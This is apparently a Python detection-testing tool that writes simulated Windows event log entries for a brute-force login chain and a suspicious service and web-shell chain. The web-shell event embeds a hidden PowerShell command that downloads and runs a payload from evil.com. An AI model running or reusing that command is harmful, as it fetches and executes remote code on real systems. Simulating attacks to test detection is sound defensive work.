import sys
import time
import win32evtlog
import win32evtlogutil


def simulate_brute_force_chain(target_user: str, source_ip: str):
    """
    Simulates: 5 failed logins -> 1 success -> privilege escalation -> cmd.exe executing whoami -> credential read
    """
    print(f"\n[SIMULATOR] Starting BRUTE_FORCE_CHAIN on user '{target_user}' from IP '{source_ip}'...")

    # 1. 5 Failed logins (Event ID 4625)
    for i in range(5):
        strings = [""] * 20
        strings[5] = target_user
        strings[6] = "WORKGROUP"
        strings[10] = "3"  # Logon Type: Network
        strings[19] = source_ip
        
        win32evtlogutil.ReportEvent(
            "SentinelX-Simulator",
            4625,
            0,
            win32evtlog.EVENTLOG_WARNING_TYPE,
            strings
        )
        print(f"  [+] Sent LOGIN_FAILURE {i+1}/5")
        time.sleep(0.5)

    # 2. 1 Successful login (Event ID 4624)
    strings = [""] * 20
    strings[5] = target_user
    strings[6] = "WORKGROUP"
    strings[8] = "3"  # Logon Type: Network
    strings[18] = source_ip
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        4624,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print("  [+] Sent LOGIN_SUCCESS")
    time.sleep(0.5)

    # 3. Privilege Escalation / Special Privilege Assignment (Event ID 4672)
    strings = [""] * 10
    strings[1] = target_user
    strings[2] = "WORKGROUP"
    strings[3] = "SeSecurityPrivilege\nSeTakeOwnershipPrivilege\nSeDebugPrivilege"
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        4672,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print("  [+] Sent SPECIAL_PRIVILEGES (SeDebugPrivilege, SeTakeOwnershipPrivilege)")
    time.sleep(0.5)

    # 4. Spawn cmd.exe (Event ID 4688)
    strings = [""] * 15
    strings[1] = target_user
    strings[2] = "WORKGROUP"
    strings[4] = "0x400a"
    strings[5] = "C:\\Windows\\System32\\cmd.exe"
    strings[8] = "cmd.exe"
    strings[13] = "C:\\Windows\\explorer.exe"
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        4688,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print("  [+] Sent PROCESS_CREATED (cmd.exe)")
    time.sleep(0.5)

    # 5. cmd.exe spawning whoami.exe (Event ID 4688 - suspicious chain)
    strings = [""] * 15
    strings[1] = target_user
    strings[2] = "WORKGROUP"
    strings[4] = "0x400b"
    strings[5] = "C:\\Windows\\System32\\whoami.exe"
    strings[8] = "whoami /priv"
    strings[13] = "C:\\Windows\\System32\\cmd.exe"
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        4688,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print("  [+] Sent PROCESS_CREATED (whoami.exe spawned by cmd.exe)")
    time.sleep(0.5)

    # 6. Credential Manager credentials read (Event ID 5379)
    strings = [""] * 10
    strings[1] = target_user
    strings[2] = "WORKGROUP"
    strings[4] = "git:https://github.com"
    strings[5] = "1"
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        5379,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print("  [+] Sent CREDENTIAL_ACCESS (Credential Manager Read)")
    print("[SIMULATOR] BRUTE_FORCE_CHAIN simulation finished.\n")


def simulate_suspicious_service_chain(service_name: str, executable_path: str):
    """
    Simulates: New service installation -> w3wp spawning powershell -> outbound network connection
    """
    print(f"\n[SIMULATOR] Starting SUSPICIOUS_SERVICE_CHAIN for service '{service_name}'...")

    # 1. New Service Installed (Event ID 4697)
    strings = [""] * 10
    strings[0] = service_name
    strings[1] = executable_path
    strings[4] = "LocalSystem"
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        4697,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print(f"  [+] Sent SERVICE_INSTALLED ({service_name})")
    time.sleep(0.5)

    # 2. Server w3wp.exe spawning powershell.exe (Event ID 4688 - Web Shell execution)
    strings = [""] * 15
    strings[1] = "IUSR"
    strings[2] = "IIS APPPOOL"
    strings[4] = "0x510a"
    strings[5] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    strings[8] = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\""
    strings[13] = "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
    
    win32evtlogutil.ReportEvent(
        "SentinelX-Simulator",
        4688,
        0,
        win32evtlog.EVENTLOG_INFORMATION_TYPE,
        strings
    )
    print("  [+] Sent PROCESS_CREATED (w3wp.exe spawning powershell.exe)")
    print("[SIMULATOR] SUSPICIOUS_SERVICE_CHAIN simulation finished.\n")


if __name__ == "__main__":
    print("============================================================")
    print("       SentinelX Autonomous Telemetry Attack Simulator       ")
    print("============================================================")
    print("Select a scenario to simulate:")
    print("  1. BRUTE_FORCE_CHAIN (Credential stuffing, elevation & execution)")
    print("  2. SUSPICIOUS_SERVICE_CHAIN (Persistence & web shell execution)")
    print("============================================================")
    
    choice = input("Enter choice (1 or 2): ").strip()
    
    if choice == "1":
        simulate_brute_force_chain("simulated-admin", "192.168.10.88")
    elif choice == "2":
        simulate_suspicious_service_chain("SentinelBackdoor", "C:\\temp\\backdoor_service.exe")
    else:
        print("[!] Invalid choice. Exiting.")
